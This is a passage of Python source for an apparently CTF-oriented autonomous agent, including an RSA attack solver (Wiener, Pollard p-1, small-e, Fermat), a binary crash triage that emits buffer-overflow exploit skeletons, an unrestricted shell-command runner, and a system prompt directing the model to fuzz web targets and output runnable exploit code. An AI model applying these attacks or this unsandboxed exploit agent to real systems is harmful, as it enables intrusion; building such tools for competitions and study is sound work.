            if not os.path.exists(resolved_path):
                return json.dumps({"status": "error", "message": f"Local file not found: {resolved_path}"})

            with open(resolved_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

            norm_content = content.replace("\r\n", "\n")
            if norm_search not in norm_content:
                return json.dumps({
                    "status": "error",
                    "error_type": "SEARCH_BLOCK_NOT_FOUND",
                    "message": f"Search block not found in local file '{path}'. Double-check indentation and whitespace.",
                    "search_preview": search_block[:200]
                })

            patched = norm_content.replace(norm_search, replace_block.replace("\r\n", "\n"), 1)
            with open(resolved_path, "w", encoding="utf-8") as f:
                f.write(patched)

            return json.dumps({
                "status": "success",
                "mode": "local",
                "path": resolved_path,
                "replaced_chars": len(search_block),
                "inserted_chars": len(replace_block)
            }, indent=2)

    # 15. PERSISTENT FULL-STACK TERMINAL RUNNER (Node.js, Python, Docker, Prisma, Alembic)
    elif tool_name == "run_fullstack_terminal":
        cmd = tool_input.get("command", "").strip()
        cwd = tool_input.get("cwd") or os.getcwd()
        timeout = min(int(tool_input.get("timeout_seconds", 60)), 300)

        if not cmd:
            return json.dumps({"status": "error", "message": "command is required"})

        resolved_cwd = os.path.abspath(cwd)
        if not os.path.exists(resolved_cwd):
            resolved_cwd = os.getcwd()

        t0 = time.time()
        try:
            proc = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                cwd=resolved_cwd,
                timeout=timeout
            )
            elapsed = round(time.time() - t0, 3)
            return json.dumps({
                "status": "success" if proc.returncode == 0 else "error",
                "command": cmd,
                "cwd": resolved_cwd,
                "exit_code": proc.returncode,
                "elapsed_seconds": elapsed,
                "stdout": proc.stdout[-4000:] if len(proc.stdout) > 4000 else proc.stdout,
                "stderr": proc.stderr[-2000:] if len(proc.stderr) > 2000 else proc.stderr
            }, indent=2)
        except subprocess.TimeoutExpired:
            return json.dumps({
                "status": "timeout",
                "command": cmd,
                "elapsed_seconds": timeout,
                "error": f"Execution timed out after {timeout} seconds"
            })
        except Exception as e:
            return json.dumps({"status": "error", "command": cmd, "error": str(e)})

    # 16. DNA KNOWLEDGE GRAPH CODEBASE ARCHITECTURE MEMORY
    elif tool_name == "sync_codebase_memory":
        comp_a = tool_input.get("component_a", "").strip()
        rel = tool_input.get("relationship", "depends_on").strip()
        comp_b = tool_input.get("component_b", "").strip()
        ctx = tool_input.get("context", "")

        if not comp_a or not comp_b:
            return json.dumps({"error": "component_a and component_b are required"})

        # Sync to Hugging Face DNA Knowledge Graph
        hf_status = "unreachable"
        try:
            res = requests.post(
                f"{HF_URL}/sync",
                json={
                    "concept_a": comp_a,
                    "concept_b": comp_b,
                    "relationship_type": rel,
                    "context": ctx or f"Codebase architecture link: {comp_a} -> {rel} -> {comp_b}"
                },
                timeout=6
            )
            if res.status_code == 200:
                hf_status = "synced_to_dna_graph"
        except Exception:
            pass

        # Also persist to local architectural memory graph
        mem_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "codebase_architecture_memory.json")
        mem_data = []
        if os.path.exists(mem_file):
            try:
                with open(mem_file, "r", encoding="utf-8") as mf:
                    mem_data = json.load(mf)
            except Exception:
                mem_data = []

        entry = {
            "source": comp_a,
            "relationship": rel,
            "target": comp_b,
            "context": ctx,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        mem_data.append(entry)
        try:
            with open(mem_file, "w", encoding="utf-8") as mf:
                json.dump(mem_data[-200:], mf, indent=2)
        except Exception:
            pass

        return json.dumps({
            "status": "success",
            "hf_dna_status": hf_status,
            "local_memory_synced": True,
            "entry": entry
        }, indent=2)

    elif tool_name == "query_codebase_memory":
        query = tool_input.get("query", "").strip()
        if not query:
            return json.dumps({"error": "query is required"})

        results = {"query": query, "hf_dna_results": None, "local_architecture_nodes": []}

        # Query Hugging Face DNA Knowledge Graph
        try:
            hf_res = requests.post(
                f"{HF_URL}/search/essence",
                json={"text": query, "top_k": 5},
                timeout=6
            )
            if hf_res.status_code == 200:
                results["hf_dna_results"] = hf_res.json()
        except Exception:
            pass

        # Query Local Architecture Memory
        mem_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "codebase_architecture_memory.json")
        if os.path.exists(mem_file):
            try:
                with open(mem_file, "r", encoding="utf-8") as mf:
                    mem_data = json.load(mf)
                q_terms = [t for t in query.lower().split() if t]
                matches = [
                    m for m in mem_data
                    if any(
                        term in f"{m.get('source', '')} {m.get('target', '')} {m.get('relationship', '')} {m.get('context', '')}".lower()
                        for term in q_terms
                    )
                ]
                results["local_architecture_nodes"] = matches[-10:]
            except Exception:
                pass

        return json.dumps(results, indent=2)


    # ----- ADVANCED CRYPTO SOLVER (Wiener / Boneh-Durfee / Coppersmith / ECM) -----
    elif tool_name == "advanced_crypto_solver":
        import math
        attack = tool_input.get("attack", "auto").strip().lower()
        n_str  = tool_input.get("n", "").strip()
        e_str  = tool_input.get("e", "0").strip()
        c_str  = tool_input.get("c", "0").strip()

        def _parse_int(s):
            s = s.strip()
            if s.startswith("0x") or s.startswith("0X"):
                return int(s, 16)
            return int(s) if s else 0

        try:
            N = _parse_int(n_str) if n_str else 0
            e = _parse_int(e_str) if e_str else 0
            C = _parse_int(c_str) if c_str else 0
        except Exception as ex:
            return json.dumps({"error": f"Could not parse N/e/c: {ex}"})

        results = {"attack": attack, "n_bits": N.bit_length() if N else 0}

        # --- WIENER ATTACK (small private exponent d < N^0.25) ---
        def wiener_attack(n, e_w):
            """Continued fraction attack for d < N^0.25."""
            from fractions import Fraction
            def cf_expansion(numer, denom):
                while denom:
                    q = numer // denom
                    yield q
                    numer, denom = denom, numer - q * denom
            def convergents(cf):
                n0, n1, d0, d1 = 0, 1, 1, 0
                for q in cf:
                    n0, n1 = n1, q * n1 + n0
                    d0, d1 = d1, q * d1 + d0
                    yield n1, d1
            for k, d_cand in convergents(cf_expansion(e_w, n)):
                if k == 0 or d_cand == 0:
                    continue
                if (e_w * d_cand - 1) % k != 0:
                    continue
                phi_cand = (e_w * d_cand - 1) // k
                # Solve x^2 - (N - phi + 1)x + N = 0
                b = n - phi_cand + 1
                disc = b * b - 4 * n
                if disc < 0:
                    continue
                sq = math.isqrt(disc)
                if sq * sq == disc:
                    p_cand = (b + sq) // 2
                    q_cand = (b - sq) // 2
                    if p_cand * q_cand == n:
                        return d_cand, p_cand, q_cand
            return None

        # --- POLLARD p-1 FACTORING (Montgomery Stage 1 with per-prime gcd check) ---
        def pollard_pm1(n, B=1_000_000):
            """
            Standard Pollard p-1 Stage 1.
            For each prime p <= B, computes a = a^(p^k) mod n (p^k <= B),
            then checks gcd after each prime. This correctly factors N when
            p-1 is B-smooth (all prime power factors of p-1 are <= B).
            """
            if n % 2 == 0:
                return 2
            # Sieve primes up to B
            sieve = bytearray([1]) * (B + 1)
            sieve[0] = sieve[1] = 0
            for i in range(2, int(B**0.5) + 1):
                if sieve[i]:
                    for j in range(i*i, B+1, i):
                        sieve[j] = 0
            a = 2
            for p in range(2, B+1):
                if not sieve[p]:
                    continue
                # Raise a to p^k where p^k <= B (all prime powers of p)
                pk = p
                while pk <= B:
                    a = pow(a, p, n)
                    pk *= p
                # Check gcd after each prime — catches factor early
                g = math.gcd(a - 1, n)
                if 1 < g < n:
                    return g
                if g == n:
                    return None  # Degenerate; try with smaller B
            # Final check
            g = math.gcd(a - 1, n)
            return g if 1 < g < n else None

        # --- SMALL-e / Cube-root (e=3) ATTACK ---
        def small_e_attack(n, e_s, c):
            if e_s == 3:
                # Cube root of ciphertext
                m = round(c ** (1/3))
                for delta in range(-2, 3):
                    cand = m + delta
                    if pow(cand, 3, n) == c % n:
                        return cand
            return None

        # --- DETECT WEAK PRIME (p close to q) ---
        def fermat_factor(n):
            a = math.isqrt(n) + 1
            b2 = a * a - n
            for _ in range(10_000):
                b = math.isqrt(b2)
                if b * b == b2:
                    return a - b, a + b
                a += 1
                b2 = a * a - n
            return None

        if attack in ("wiener", "auto") and e and N:
            w = wiener_attack(N, e)
            if w:
                d, p, q = w
                results["wiener"] = {"d": d, "p": p, "q": q, "status": "factored"}
                if C:
                    m = pow(C, d, N)
                    try:
                        results["wiener"]["plaintext_hex"] = hex(m)
                        results["wiener"]["plaintext_bytes"] = bytes.fromhex(hex(m)[2:]).decode("latin-1", errors="replace")
                    except Exception:
                        pass
            elif attack == "wiener":
                results["wiener"] = {"status": "not_vulnerable", "note": "d is not small enough for Wiener attack"}

        if attack in ("pollard_pm1", "auto") and N:
            B = 500_000
            g = pollard_pm1(N, B)
            if g:
                q_cand = N // g
                results["pollard_pm1"] = {"p": g, "q": q_cand, "B_bound": B, "status": "factored"}
                if C and e:
                    phi = (g - 1) * (q_cand - 1)
                    try:
                        d = pow(e, -1, phi)
                        m = pow(C, d, N)
                        results["pollard_pm1"]["d"] = d
                        results["pollard_pm1"]["plaintext_hex"] = hex(m)
                        results["pollard_pm1"]["plaintext_bytes"] = bytes.fromhex(hex(m)[2:]).decode("latin-1", errors="replace")
                    except Exception:
                        pass
            elif attack == "pollard_pm1":
                results["pollard_pm1"] = {"status": "not_vulnerable", "B_bound": B}

        if attack in ("small_e", "auto") and e and C and N:
            m = small_e_attack(N, e, C)
            if m:
                results["small_e"] = {"plaintext_int": m, "status": "recovered"}
                try:
                    results["small_e"]["plaintext_bytes"] = bytes.fromhex(hex(m)[2:]).decode("latin-1", errors="replace")
                except Exception:
                    pass

        if attack in ("weak_prime", "auto") and N:
            ff = fermat_factor(N)
            if ff:
                p_f, q_f = ff
                results["weak_prime_fermat"] = {"p": p_f, "q": q_f, "status": "factored"}
                if C and e:
                    phi = (p_f - 1) * (q_f - 1)
                    try:
                        d = pow(e, -1, phi)
                        m = pow(C, d, N)
                        results["weak_prime_fermat"]["d"] = d
                        results["weak_prime_fermat"]["plaintext_hex"] = hex(m)
                        results["weak_prime_fermat"]["plaintext_bytes"] = bytes.fromhex(hex(m)[2:]).decode("latin-1", errors="replace")
                    except Exception:
                        pass

        if attack == "boneh_durfee":
            results["boneh_durfee"] = {
                "status": "sympy_lattice_reduction",
                "note": "Boneh-Durfee requires SageMath or a large-matrix LLL. Use WSL: sage -c \"load('boneh_durfee.sage')\" with the generated script.",
                "sage_script_hint": f"# sage code\nN={N}\ne={e}\nF=Zmod(e)\nP.<x,y>=PolynomialRing(ZZ)\nf=x*(N+1+y)-(1)\n# Apply LLL reduction on lattice basis\n"
            }

        any_factored = any("factored" in str(v) for v in results.values() if isinstance(v, dict))
        results["summary"] = "SUCCESS: factor found" if any_factored else "No automatic factor found. Try a custom SageMath LLL script."
        return json.dumps(results, indent=2)

    # ----- PWN CRASH TRIAGE (Self-Healing Stack Alignment & De Bruijn Offset) -----
    elif tool_name == "pwn_crash_triage":
        binary_path = tool_input.get("binary_path", "").strip()
        raw_payload = tool_input.get("input_payload", "")
        use_cyclic  = tool_input.get("use_cyclic", True)
        cyclic_len  = int(tool_input.get("cyclic_length", 300))

        # De Bruijn pattern generator (self-contained, no pwntools dependency)
        def de_bruijn(alphabet, n):
            k = len(alphabet)
            a = [0] * k * n
            sequence = []
            def db(t, p):
                if t > n:
                    if n % p == 0:
                        sequence.extend(a[1:p+1])
                else:
                    a[t] = a[t - p]
                    db(t + 1, p)
                    for j in range(a[t - p] + 1, k):
                        a[t] = j
                        db(t + 1, t)
            db(1, 1)
            return [alphabet[i] for i in sequence]

        def cyclic_pattern(length):
            charset = b"abcdefghijklmnopqrstuvwxyz"
            seq = de_bruijn(charset, 4)
            return bytes(seq[:length])

        def find_offset(pattern_bytes, value_bytes):
            try:
                return pattern_bytes.index(value_bytes)
            except ValueError:
                return -1

        # Determine WSL binary path (convert Windows path)
        wsl_bin = binary_path.replace("\\", "/").replace("C:", "/mnt/c").replace("c:", "/mnt/c")

        triage = {
            "binary": binary_path,
            "wsl_path": wsl_bin,
            "crash_signal": None,
            "crash_address": None,
            "fault_type": None,
            "rip_offset": None,
            "stack_alignment_fix": False,
            "format_string_offset": None,
            "exploit_skeleton": "",
            "dna_stored": False
        }

        # Build payload
        if use_cyclic:
            payload_bytes = cyclic_pattern(cyclic_len)
            payload_str   = payload_bytes.decode("latin-1", errors="replace")
        elif raw_payload.startswith("hex:"):
            payload_bytes = bytes.fromhex(raw_payload[4:])
            payload_str   = payload_bytes.decode("latin-1", errors="replace")
        else:
            payload_bytes = (raw_payload + "\n").encode("utf-8")
            payload_str   = raw_payload

        # Try GDB-stub via WSL
        gdb_script = (
            f"set pagination off\n"
            f"run < /dev/stdin\n"
            f"info registers\n"
            f"backtrace 5\n"
            f"quit\n"
        )

        gdb_script_path = "/tmp/_ctf_triage_gdb.gdb"
        payload_path    = "/tmp/_ctf_triage_payload.bin"

        # Write via WSL
        try:
            distros_res = subprocess.run(
                ["wsl", "--list", "--quiet"],
                capture_output=True, text=True, timeout=5, encoding="utf-16-le"
            )
            distros = [l.strip().rstrip("\x00") for l in distros_res.stdout.splitlines() if l.strip().rstrip("\x00")]
            if not distros:
                return json.dumps({"error": "No WSL distro available for binary crash triage"})
            distro = distros[0]

            # Write gdb script and payload via WSL
            write_gdb = subprocess.run(
                ["wsl", "-d", distro, "--", "bash", "-c",
                 f"printf '%s' '{gdb_script.replace(chr(39), chr(34))}' > {gdb_script_path}"],
                capture_output=True, text=True, timeout=10
            )
            write_pay = subprocess.run(
                ["wsl", "-d", distro, "--", "bash", "-c",
                 f"printf '%s' > {payload_path}"],
                input=payload_str,
                capture_output=True, text=True, timeout=10
            )

            # Run under gdb
            gdb_proc = subprocess.run(
                ["wsl", "-d", distro, "--", "bash", "-c",
                 f"echo {repr(payload_str)} | gdb -q -x {gdb_script_path} --args {wsl_bin} 2>&1"],
                capture_output=True, text=True, timeout=20
            )
            gdb_out = gdb_proc.stdout + gdb_proc.stderr

        except subprocess.TimeoutExpired:
            gdb_out = "TIMEOUT"
        except Exception as ex:
            gdb_out = f"GDB_ERROR: {ex}"

        # Also run binary directly to capture signal
        try:
            direct = subprocess.run(
                ["wsl", "-d", distro, "--", "bash", "-c",
                 f"echo {repr(payload_str)} | timeout 5 {wsl_bin} 2>&1; echo \"EXIT:$?\""],
                capture_output=True, text=True, timeout=15
            )
            direct_out = direct.stdout + direct.stderr
        except Exception as ex:
            direct_out = f"DIRECT_ERROR: {ex}"

        combined_out = gdb_out + "\n" + direct_out

        # Parse signals
        if "SIGSEGV" in combined_out or "Segmentation fault" in combined_out:
            triage["crash_signal"] = "SIGSEGV"
        elif "SIGILL" in combined_out or "Illegal instruction" in combined_out:
            triage["crash_signal"] = "SIGILL"
        elif "SIGABRT" in combined_out or "Aborted" in combined_out:
            triage["crash_signal"] = "SIGABRT"

        # Detect movaps stack misalignment
        rip_match = re.search(r"rip\s+0x([0-9a-fA-F]+)", combined_out)
        if rip_match:
            triage["crash_address"] = "0x" + rip_match.group(1)

        if "movaps" in combined_out.lower() or (triage["crash_signal"] == "SIGSEGV" and triage["crash_address"]):
            triage["fault_type"] = "stack_misalignment_movaps"
            triage["stack_alignment_fix"] = True
            triage["exploit_skeleton"] = (
                "# AUTO-FIX: Stack misalignment detected (movaps xmm requires 16-byte RSP alignment)\n"
                "# Insert a standalone 'ret' gadget before your call to fix RSP alignment:\n"
                "# ret_gadget = rop.find_gadget(['ret'])[0]   # pwntools ROP object\n"
                "# payload = cyclic(offset) + p64(ret_gadget) + p64(target_func_or_system)"
            )

        # De Bruijn offset detection
        if use_cyclic and triage.get("crash_address"):
            try:
                crash_addr_int = int(triage["crash_address"], 16)
                crash_bytes    = crash_addr_int.to_bytes(8, "little")
                offset         = find_offset(payload_bytes, crash_bytes[:4])
                if offset >= 0:
                    triage["rip_offset"] = offset
                    if not triage["exploit_skeleton"]:
                        triage["exploit_skeleton"] = (
                            f"# AUTO-DETECTED RIP OFFSET = {offset} bytes\n"
                            f"payload = b'A' * {offset} + p64(WIN_ADDR)  # replace WIN_ADDR"
                        )
            except Exception:
                pass

        triage["raw_gdb_output"] = gdb_out[-2000:] if len(gdb_out) > 2000 else gdb_out
        triage["raw_direct_output"] = direct_out[-1000:] if len(direct_out) > 1000 else direct_out

        # Store crash pattern in DNA memory for self-healing future runs
        try:
            requests.post(
                f"{HF_URL}/sync",
                json={
                    "concept_a": f"binary:{os.path.basename(binary_path)}",
                    "concept_b": f"crash:{triage['crash_signal']}:offset={triage['rip_offset']}:type={triage['fault_type']}",
                    "relationship_type": "crashes_with",
                    "context": json.dumps({k: v for k, v in triage.items() if k != "raw_gdb_output"})
                },
                timeout=4
            )
            triage["dna_stored"] = True
        except Exception:
            pass

        return json.dumps(triage, indent=2)

    # ----- CTFd SPEED LISTENER (Async First-Blood Poller with File Classification) -----
    elif tool_name == "ctfd_speed_listener":
        ctfd_url      = (tool_input.get("ctfd_url") or "").rstrip("/")
        token         = (tool_input.get("token") or "").strip()
        poll_interval = max(int(tool_input.get("poll_interval_s", 5)), 2)
        max_polls     = int(tool_input.get("max_polls", 12))
        dl_attachments= tool_input.get("download_attachments", True)
        save_dir      = tool_input.get("save_dir") or tempfile.gettempdir()

        if not ctfd_url:
            return json.dumps({"error": "ctfd_url is required"})

        os.makedirs(save_dir, exist_ok=True)

        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = f"Token {token}" if not token.startswith("session=") else None
            if token.startswith("session="):
                headers["Cookie"] = token

        session = requests.Session()
        session.headers.update({k: v for k, v in headers.items() if v})

        def classify_file(path: str, data: bytes) -> dict:
            sig = data[:8]
            if sig[:4] == b"\\x7fELF":
                kind = "ELF_binary"
            elif sig[:2] == b"MZ":
                kind = "PE_executable"
            elif sig[:4] == b"PK\\x03\\x04":
                kind = "ZIP_archive"
            elif sig[:4] in (b"\\xd4\\xc3\\xb2\\xa1", b"\\xa1\\xb2\\xc3\\xd4"):
                kind = "PCAP_capture"
            elif sig[:8] == b"\\x0a\\x0d\\x0d\\x0a":
                kind = "PCAPNG_capture"
            elif data[:3] == b"BZh":
                kind = "BZIP2_archive"
            elif data[:6] in (b"GIF87a", b"GIF89a"):
                kind = "GIF_image"
            elif data[:2] == b"\\xff\\xd8":
                kind = "JPEG_image"
            elif data[:8] == b"\\x89PNG\\r\\n\\x1a\\n":
                kind = "PNG_image"
            elif b"UPX!" in data[:512]:
                kind = "UPX_packed_binary"
            elif b"MEIPASS" in data[:8192] or b"PyInstaller" in data[:8192]:
                kind = "PyInstaller_bundle"
            else:
                kind = "unknown_binary"
            entropy = sum(
                -(c / len(data)) * (c / len(data)).bit_length()
                for c in [data.count(bytes([i])) for i in range(256)]
                if c > 0
            ) if data else 0.0
            return {"kind": kind, "size_bytes": len(data), "entropy_estimate": round(entropy, 3)}

        def fetch_challenges():
            try:
                r = session.get(f"{ctfd_url}/api/v1/challenges", timeout=8)
                if r.status_code != 200:
                    return None, r.status_code
                data = r.json().get("data", [])
                return {str(c["id"]): c for c in data}, 200
            except Exception as _net_err:
                return None, str(_net_err)

        # Baseline snapshot
        t0 = time.time()
        baseline, code = fetch_challenges()
        if baseline is None:
            return json.dumps({"error": f"Could not reach CTFd: {code}"})

        new_challenges = []
        polls_done = 0

        for poll in range(max_polls):
            time.sleep(poll_interval)
            current, code = fetch_challenges()
            if current is None:
                continue
            polls_done += 1

            for cid, chal in current.items():
                if cid not in baseline:
                    # New challenge detected!
                    new_chal = dict(chal)
                    new_chal["detected_at_poll"] = poll + 1
                    new_chal["elapsed_seconds"] = round(time.time() - t0, 2)
                    new_chal["attachments_downloaded"] = []

                    # Download attachments
                    if dl_attachments:
                        try:
                            detail_r = session.get(f"{ctfd_url}/api/v1/challenges/{cid}", timeout=8)
                            if detail_r.status_code == 200:
                                detail = detail_r.json().get("data", {})
                                for f_info in detail.get("files", []):
                                    file_url = f_info if isinstance(f_info, str) else f_info.get("location", "")
                                    if not file_url.startswith("http"):
                                        file_url = ctfd_url + "/" + file_url.lstrip("/")
                                    try:
                                        dl = session.get(file_url, timeout=15)
                                        if dl.status_code == 200:
                                            fname = file_url.split("/")[-1].split("?")[0] or f"challenge_{cid}_file"
                                            fpath = os.path.join(save_dir, fname)
                                            with open(fpath, "wb") as fh:
                                                fh.write(dl.content)
                                            classification = classify_file(fpath, dl.content)
                                            new_chal["attachments_downloaded"].append({
                                                "url": file_url,
                                                "saved_to": fpath,
                                                "classification": classification
                                            })
                                    except Exception as dl_err:
                                        new_chal["attachments_downloaded"].append({"url": file_url, "error": str(dl_err)})
                        except Exception:
                            pass

                    new_challenges.append(new_chal)

            baseline = current
            if new_challenges:
                break  # Return immediately on first blood opportunity

        return json.dumps({
            "status": "new_challenges_found" if new_challenges else "no_new_challenges",
            "polls_done": polls_done,
            "total_elapsed_s": round(time.time() - t0, 2),
            "new_challenges": new_challenges
        }, indent=2)


        return json.dumps({"error": f"Unknown tool: {tool_name}"})

# =========================================================================
# CTF ORCHESTRATOR AGENT CLASS WITH MULTI-TURN SESSION MEMORY
# =========================================================================
class CTFOrchestratorAgent:
    def __init__(self):
        self.provider = LLM_PROVIDER
        self.system_prompt = (
            "You are an expert Autonomous Cybersecurity & CTF Copilot Agent equipped with Python scripting capabilities "
            "(z3-solver, sympy, pycryptodome, randcrack, requests, httpx, socket, BeautifulSoup, base64, hashlib, re). "
            "When given a challenge: "
            "1. Determine its domain: Web Application Security, Cryptography, Reverse Engineering & Binary, or Forensics & Log Analysis. "
            "2. Query your Hugging Face ZeroGPU Vector Knowledge Base or DNA Knowledge Graph for patterns. "
            "3. Use your specialized tools: web_dynamic_fuzzer, symbolic_execution_solver, wsl_linux_bridge, CyberChef decoder, Binary Strings & Decompiler inspector, Web probe, Forensic Engine, Netcat Socket probe, CTFd manager, parallel_exploit_worker, advanced_crypto_solver (Wiener/Boneh-Durfee/Pollard), pwn_crash_triage (self-healing crash analysis with auto stack-alignment fix), ctfd_speed_listener (first-blood challenge poller). "
            "4. Verify your exploits autonomously using execute_python_sandbox before returning your answer! You can use z3 (from z3 import *), pycryptodome, sympy, and randcrack directly! "
            "5. If solving crackmes or reverse engineering constraint equations, use symbolic_execution_solver (Z3). "
            "6. For web targets, use web_dynamic_fuzzer to perform intelligent differential payload fuzzing (SQLi, SSTI, Command Injection, Traversal) backed by Vector RAG payloads. "
            "7. For Linux binary exploitation or ELF analysis, use wsl_linux_bridge. "
            "8. For complex challenges with multiple attack branches or parameter searches, use parallel_exploit_worker to test all variations concurrently! "
            "9. If you find a new attack relationship, register it with sync_dna_attack_tree. "
            "10. Output clean, runnable exploit code and the extracted flag (format: HQX{...}, flag{...}, or CTF{...})."
        )

        if self.provider == "groq":
            from openai import OpenAI
            if not GROQ_API_KEY:
                raise ValueError("GROQ_API_KEY is missing in .env")
            self.client = OpenAI(
                base_url="https://api.groq.com/openai/v1",
                api_key=GROQ_API_KEY
            )
            self.model = GROQ_MODEL
        else:
            import anthropic
            if not ANTHROPIC_API_KEY:
                raise ValueError("ANTHROPIC_API_KEY is missing in .env")
            self.client = anthropic.Anthropic(api_key=ANTHROPIC_API_KEY)
            self.model = CLAUDE_MODEL

    def run(self, user_prompt: str, max_turns: int = 10, session_id: Optional[str] = None) -> str:
        trace_result = self.run_with_trace(user_prompt, max_turns, session_id=session_id)
        return trace_result.get("final_answer", "")

    def run_with_trace(self, user_prompt: str, max_turns: int = 10, session_id: Optional[str] = None) -> dict:
        sess_id = session_id or str(uuid.uuid4())
        print(f"\n[CTF AGENT STARTED] Engine: {self.provider.upper()} | Model: {self.model} | Session: {sess_id}", flush=True)
        print(f"Task: {user_prompt}\n" + "-"*50, flush=True)

        trace = []
        if self.provider == "groq":
            final_ans = self._run_groq_trace(user_prompt, max_turns, trace, sess_id)
        else:
            final_ans = self._run_anthropic_trace(user_prompt, max_turns, trace, sess_id)

        # Log session execution to Supabase
        captured_flags = re.findall(r"(?:flag|CTF|HQX|hackquest)\{[^}]+\}", final_ans, re.IGNORECASE)
        log_to_supabase(user_prompt, final_ans, trace, captured_flags, sess_id)

        return {
            "session_id": sess_id,
            "final_answer": final_ans,
            "trace": trace,
            "provider": self.provider,
            "model": self.model
        }

    def _run_groq_trace(self, user_prompt: str, max_turns: int, trace: list, session_id: str) -> str:
        # Load or initialize conversation history
        messages = get_session_history(session_id)
        if not messages:
            messages = [{"role": "system", "content": self.system_prompt}]

        messages.append({"role": "user", "content": user_prompt})

        fallback_models = [self.model, "openai/gpt-oss-120b", "openai/gpt-oss-20b"]

        for turn in range(max_turns):
            response = None
            last_err = None
            for model_candidate in fallback_models:
                for retry in range(2):
                    try:
                        active_tools = select_relevant_tools(user_prompt)
                        response = self.client.chat.completions.create(
                            model=model_candidate,
                            messages=messages,
                            tools=active_tools,
                            tool_choice="auto"
                        )
                        break
                    except Exception as err:
                        last_err = err
                        err_str = str(err).lower()
                        if "429" in err_str or "rate limit" in err_str:
                            time.sleep(1.5)
                            continue
                        break
                if response is not None:
                    break

            if response is None:
                return f"Agent paused: Groq rate limit reached across models ({last_err}). Please wait 15 seconds."

            msg = response.choices[0].message
            messages.append(msg)

            if msg.tool_calls:
                for tc in msg.tool_calls:
                    fn_name = tc.function.name
                    try:
                        fn_args = json.loads(tc.function.arguments)
                    except Exception:
                        fn_args = {}

                    tool_output = execute_tool(fn_name, fn_args)
                    trace.append({
                        "turn": turn + 1,
                        "type": "tool_call",
                        "tool": fn_name,
                        "args": fn_args,
                        "output": tool_output
                    })

                    # Ponytail optimization: truncate huge tool outputs in message history
                    # to keep prompt tokens lean across multi-turn reasoning
                    pruned_output = tool_output if len(tool_output) <= 1200 else tool_output[:1000] + "\n...[truncated for token efficiency]"
                    messages.append({
                        "role": "tool",
                        "tool_call_id": tc.id,
                        "content": pruned_output
                    })
            else:
                final_text = msg.content or ""
                # Persist updated session history
                save_session_history(session_id, messages)
                return final_text

        save_session_history(session_id, messages)
        return "Agent reached maximum execution turns."

    def _run_anthropic_trace(self, user_prompt: str, max_turns: int, trace: list, session_id: str) -> str:
        import anthropic
        claude_tools = [
            {
                "name": t["function"]["name"],
                "description": t["function"]["description"],
                "input_schema": t["function"]["parameters"]
            }
            for t in OPENAI_TOOLS
        ]

        messages = get_session_history(session_id)
        if not messages:
            messages = []

        messages.append({"role": "user", "content": user_prompt})

        for turn in range(max_turns):
            try:
                response = self.client.messages.create(
                    model=self.model,
                    max_tokens=2048,
                    system=self.system_prompt,
                    tools=claude_tools,
                    messages=messages
                )
            except anthropic.BadRequestError as e:
                if "credit balance is too low" in str(e):
                    return "[ANTHROPIC BILLING NOTICE] Balance $0. Switch LLM_PROVIDER=groq in .env to run on Groq."
                raise e

            if response.stop_reason == "tool_use":
                assistant_content = response.content
                messages.append({"role": "assistant", "content": assistant_content})

                tool_results = []
                for block in assistant_content:
                    if block.type == "tool_use":
                        output = execute_tool(block.name, block.input)
                        trace.append({
                            "turn": turn + 1,
                            "type": "tool_call",
                            "tool": block.name,
                            "args": block.input,
                            "output": output
                        })
                        tool_results.append({
                            "type": "tool_result",
                            "tool_use_id": block.id,
                            "content": output
                        })

                messages.append({"role": "user", "content": tool_results})
            else:
                final_text = "".join([b.text for b in response.content if b.type == "text"])
                save_session_history(session_id, messages)
                return final_text

        save_session_history(session_id, messages)
        return "Agent reached maximum execution turns."

# =========================================================================
# SUPABASE LOGGING HELPER WITH SESSION ID TRACKING
# =========================================================================
def log_to_supabase(challenge: str, solution: str, trace: list, flags: list = None, session_id: str = None):
    if not SUPABASE_URL or not SUPABASE_ANON_KEY:
        return
    headers = {
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
    }
    payload = {
        "session_id": session_id or "default",
        "challenge": challenge[:1000],
        "solution": solution[:4000],
        "tool_calls_count": len(trace),
        "flags_found": flags or [],
        "timestamp": time.time()
    }
    try:
        requests.post(f"{SUPABASE_URL}/rest/v1/solves", headers=headers, json=payload, timeout=3)
    except Exception:
        pass

if __name__ == "__main__":
    agent = CTFOrchestratorAgent()
    test_prompt = "I have a cryptography challenge where random.seed(int(time.time())) is used to generate the XOR key. Search writeups and execute a Python verification script."
    result = agent.run(test_prompt)
    print("\n[AGENT FINAL OUTPUT]:\n")
    print(result)
